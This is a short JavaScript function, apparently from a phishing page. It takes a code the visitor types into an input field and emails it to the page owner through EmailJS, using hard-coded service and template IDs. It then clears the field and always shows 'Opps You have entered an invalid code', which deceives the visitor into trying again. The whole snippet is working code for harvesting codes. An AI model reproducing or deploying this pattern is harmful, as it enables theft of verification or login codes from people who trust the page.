function sendEmail() {
    var params = {
        entercode : document.getElementById("entercode").value,
    }
    const serviceID = "service_ybz3l1t" ;   
    const templateID = "template_bnplwsu";

   emailjs.send(serviceID, templateID, params)
   .then (
    res => {
        document.getElementById("entercode").value ="";
        console.log(res);
        document.getElementById("opps").innerHTML = "Opps You have entered an invalid code";
    })
    .catch((err) => console.log(err)); 
}
